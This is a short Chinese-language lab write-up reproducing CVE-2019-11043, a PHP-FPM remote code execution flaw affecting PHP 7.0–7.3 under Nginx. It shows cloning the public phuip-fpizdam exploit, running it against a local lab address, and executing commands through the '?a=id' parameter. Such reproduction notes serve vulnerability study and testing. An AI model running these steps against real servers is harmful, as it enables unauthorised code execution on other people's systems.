php 远程代码执行 (CVE-2019-11043)

描述: PHP即“超文本预处理器”，是在服务器端执行的脚本语言，尤其适用于Web开发并可嵌入HTML中。PHP语法利用了C、Java和Perl，该语言的主要目标是允许web开发人员快速编写动态网页。 该漏洞位于PHP-FPM模块的env_path_info函数，漏洞实际上是有个内存下溢破坏漏洞，攻击者利用该漏洞结合其他漏洞利用可以让攻击者在有漏洞的web网站上执行任意代码。

在 Nginx PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响：
PHP 7.0 
PHP 7.1 
PHP 7.2 
PHP 7.3 

复现

攻击机是kali，攻击脚本是go语言写的所以要有go环境

我的go环境没改，只能通过source /etc/profile运行go

![image-20211121201728802](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211121201728802.png)

从github上下载exp、

```javascript
git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
```

go run . "http://192.168.1.192:57011/index.php"

?a=id

![image-20211121202655949](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211121202655949.png)

![image-20211121202732491](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211121202732491.png)

